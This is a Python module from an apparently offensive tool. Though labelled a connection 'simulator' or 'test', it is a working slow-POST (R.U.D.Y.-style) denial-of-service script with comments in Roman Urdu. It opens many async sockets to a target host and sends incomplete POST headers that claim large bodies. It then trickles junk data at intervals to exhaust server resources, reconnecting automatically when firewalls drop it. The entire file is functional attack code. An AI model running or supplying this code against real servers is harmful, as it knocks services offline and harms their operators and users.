# modules/layer7_async.py — Advanced L7 Asynchronous Simulator (Continuous Mode)
import asyncio
import random
import sys
from utils.colors import Colors
from utils.logger import log_attack

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]

async def maintain_partial_connection(host, port, session_id):
    """Server par lagatar heavy active sessions ka load barkarar rakhna"""
    while True: # Infinite loop takay agar connection drop ho to foran naya banay
        try:
            reader, writer = await asyncio.open_connection(host, port)
            
            # Initial incomplete request header
            start_request = f"POST /{random.randint(1, 9999)} HTTP/1.1\r\n"
            start_request += f"Host: {host}\r\n"
            start_request += f"User-Agent: {random.choice(user_agents)}\r\n"
            start_request += f"Content-Length: {random.randint(5000, 50000)}\r\n" # Server ko heavy body ke intezar mein rakhna
            start_request += "Content-Type: application/x-www-form-urlencoded\r\n"
            writer.write(start_request.encode())
            await writer.drain()

            # Continuous Stream Phase: Har 1-3 seconds baad lagatar data bhejna
            while True:
                await asyncio.sleep(random.uniform(1.0, 3.0)) # Interval kam kar diya takay server ko saans na mile
                # Dynamic junk data chunk generator
                junk_payload = f"data_{random.randint(1, 9999)}={random.randint(1, 99999)}&"
                writer.write(junk_payload.encode())
                await writer.drain()
                
        except (asyncio.CancelledError):
            # Jab user khud session close kare
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass
            break
        except Exception:
            # Agar network slow ya firewall temporary block kare, to 1 sec rukh kar foran naya socket open kare
            await asyncio.sleep(1)
            continue

async def start_async_l7_test(host, port, duration, connection_limit):
    log_attack("Async_L7_Continuous_Test", host, port, duration)
    print(Colors.info(f"Initiating Aggressive Async Connection Test on {host}:{port}"))
    print(Colors.warn(f"Spawning {connection_limit} continuous activity async streams..."))

    tasks = []
    
    for i in range(connection_limit):
        task = asyncio.create_task(maintain_partial_connection(host, port, i))
        tasks.append(task)
        if i % 100 == 0:
            await asyncio.sleep(0.05) # Sockets ko thoda tezi se register karne ke liye interval kam kiya
            print(f"\r{Colors.success(f'Active Continuous Streams Registered: {i}')}", end="")

    print(f"\n{Colors.success('All streams are now active and running in continuous transmission loop.')}")
    
    # Target duration tak load maintain rakhna
    await asyncio.sleep(duration)
    
    print(Colors.info("\nTerminating continuous simulator session..."))
    for task in tasks:
        task.cancel()
        
    await asyncio.gather(*tasks, return_exceptions=True)
    print(Colors.success("Test session safely wrapped up."))
        
